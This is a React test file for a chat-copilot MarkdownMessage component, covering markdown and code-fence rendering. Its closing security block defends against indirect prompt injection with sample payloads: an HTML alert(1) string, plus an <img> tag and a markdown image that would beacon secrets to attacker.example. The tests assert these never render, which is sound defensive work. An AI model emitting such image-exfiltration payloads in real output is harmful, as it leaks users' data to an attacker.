import React from 'react'
import { render, screen } from 'uiSrc/utils/test-utils'

import MarkdownMessage from './MarkdownMessage'

describe('MarkdownMessage', () => {
  it('should render', () => {
    expect(render(<MarkdownMessage>1</MarkdownMessage>)).toBeTruthy()
  })

  it('should render plain markdown content', () => {
    render(<MarkdownMessage>Hello **world**</MarkdownMessage>)

    expect(screen.getByText(/world/i)).toBeInTheDocument()
  })

  it('should render a redis code fence via the chat code block', async () => {
    render(<MarkdownMessage>{'```redis\nGET foo\n```'}</MarkdownMessage>)

    // CodeButtonBlock resolves Monaco syntax highlighting asynchronously
    // even for its initial render; await it so the microtask settles inside
    // `act` instead of leaking past this test.
    expect(
      await screen.findByTestId('code-button-block-content'),
    ).toHaveTextContent('GET foo')
  })

  it('should render a language-less code fence via the chat code block', async () => {
    render(<MarkdownMessage>{'```\nGET foo\n```'}</MarkdownMessage>)

    // Copilot passes allLangs to MarkdownRenderer so fences without a
    // language still render as an interactive chat code block (copy/run)
    // instead of a plain <pre>.
    expect(
      await screen.findByTestId('code-button-block-content'),
    ).toHaveTextContent('GET foo')
  })

  it('should call onMessageRendered on mount', () => {
    const onMessageRendered = jest.fn()

    render(
      <MarkdownMessage onMessageRendered={onMessageRendered}>
        Hello
      </MarkdownMessage>,
    )

    expect(onMessageRendered).toHaveBeenCalledTimes(1)
  })

  describe('security', () => {
    // RED-194228 / VDP-4596: message content can be influenced by untrusted
    // data (indirect prompt injection). MarkdownRenderer renders without
    // rehype-raw, so raw HTML in the source shows as literal text instead of
    // being parsed into live elements — nothing can execute or beacon out.
    it('should render raw HTML as literal text, not as elements', () => {
      render(<MarkdownMessage>{'<p>{alert(1)}</p>'}</MarkdownMessage>)

      expect(
        screen.getByText('<p>{alert(1)}</p>', { exact: false }),
      ).toBeInTheDocument()
      expect(document.querySelector('script')).toBeNull()
    })

    it('should not render <img> tags from AI content', () => {
      const { container } = render(
        <MarkdownMessage>
          {'A bike. <img src="https://attacker.example/?leak=secret">'}
        </MarkdownMessage>,
      )

      expect(screen.getByText(/A bike\./)).toBeInTheDocument()
      expect(container.querySelector('img')).toBeNull()
    })

    // Copilot content never contains images, and markdown image syntax
    // (unlike raw HTML) reaches MarkdownRenderer's own `img` handler, which
    // renders a live <img> by default — a crafted `![](https://attacker/?...)`
    // would fire an outbound GET on load and exfiltrate data.
    it('should not render an <img> for markdown image syntax', () => {
      render(
        <MarkdownMessage>
          {'![leak](https://attacker.example/x.png)'}
        </MarkdownMessage>,
      )

      expect(document.querySelector('img')).toBeNull()
      expect(screen.queryByRole('img')).toBeNull()
    })
  })
})
